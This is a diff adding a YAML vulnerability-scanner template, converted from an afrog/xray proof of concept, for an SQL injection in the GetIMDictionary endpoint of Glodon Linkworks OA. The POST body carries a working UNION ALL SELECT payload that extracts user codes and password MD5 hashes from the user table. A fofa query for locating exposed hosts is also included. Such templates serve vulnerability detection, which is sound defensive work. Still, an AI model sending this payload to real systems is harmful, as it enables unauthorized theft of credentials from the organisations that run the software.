@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <?xml version=
+          - 'value="admin:'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary'
+id: glodon-linkworks-getimdirectionary-sqli
+info:
+  author: peiqi
+  description: |-
+    广联达 Linkworks办公OA GetIMDictionary接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息
+    fofa: body="/Services/Identification/"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 广联达 Linkworks GetIMDictionary SQL 注入
+  severity: high
+  tags: glodon,sqli,argus-import
